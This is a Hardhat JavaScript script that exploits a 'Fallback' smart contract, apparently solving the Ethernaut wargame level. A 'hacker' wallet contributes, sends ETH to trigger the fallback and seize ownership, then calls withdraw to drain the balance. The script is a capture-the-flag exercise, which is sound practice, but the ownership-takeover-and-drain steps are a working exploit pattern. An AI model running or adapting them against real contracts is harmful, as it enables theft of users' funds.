const { assert } = require("console");
const { ethers } = require("hardhat");
const hre = require("hardhat");
require("dotenv").config({ path: ".env" });

async function getContract(wallet) {
  const Fallback = await hre.ethers.getContractFactory("Fallback");
  let fallback = null;
  if(hre.network.name == "hardhat") {
    fallback = await Fallback.deploy();
    await fallback.deployed();
  }
  else {
    fallback = Fallback.attach(process.env.CONTRACT_ADDRESS);
  }
  return fallback.connect(wallet);
}

async function giveWalletMoney(hacker) {
  assert(hre.network.name == "hardhat");
  const [owner] = await ethers.getSigners();
  const trans = await owner.sendTransaction({
    to: hacker.address,
    value: ethers.utils.parseEther("0.1"),
  });
  await trans.wait()
}

async function main() {
  console.log("network name:", hre.network.name);
  const hacker = new ethers.Wallet(process.env.PRIVATE_KEY, hre.ethers.provider);
  contract = await getContract(hacker);
  if(hre.network.name == "hardhat") {
    console.log("getting some eth")
    giveWalletMoney(hacker);
  }

  console.log("hacking contract:", contract.address, await contract.owner());
  console.log("contribute");
  await contract.contribute({value: ethers.utils.parseEther("0.0001")});
  console.log("send some eth to the wallet");
  const trans = await hacker.sendTransaction({
    to: contract.address,
    value: ethers.utils.parseEther("0.0001"),
  });
  await trans.wait();
  console.log("take all the money");
  await contract.withdraw();
  
  console.log("contract is now owned by:", await contract.owner(), "and balance is:", await ethers.provider.getBalance(contract.address));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});